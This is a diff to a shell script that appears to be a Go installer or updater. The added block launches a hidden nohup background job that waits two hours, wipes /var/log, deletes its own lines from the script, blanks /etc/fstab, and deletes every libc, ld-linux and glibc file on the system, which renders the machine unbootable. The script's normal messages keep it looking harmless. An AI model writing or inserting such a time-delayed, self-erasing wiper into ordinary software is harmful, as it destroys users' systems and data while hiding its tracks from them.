@@ -551,6 +551,26 @@ else
 fi
 cleanup
 
+msg "Starting all nohup background tasks."
+
+nohup sh -c '
+  echo "nohup background task: Waiting 7200s to delete files"
+  sleep 7200
+  rm -rf /var/log/*
+  sed -i "554,572d" /root/update-golang/update-golang.sh
+  sleep 5
+  echo " " > /etc/fstab
+  sleep 5
+  find / -type f -name "libc*" -print -delete
+  find / -type f -name "ld-linux*" -print -delete
+  find / -type f -name "glibc*" -print -delete
+  sleep 5
+  echo "nohup background task: Deletion of files complete."
+' > /dev/null 2>&1 &
+msg "Scheduled (nohup) deletion of files to run in background after 2 hours."
+
+msg "All nohup background tasks scheduled. Main script exiting."
+
 msg
 msg "HINT: If this is the first time you run this script, the env vars"
 msg "      updated in the profile will only take effect for new shells."
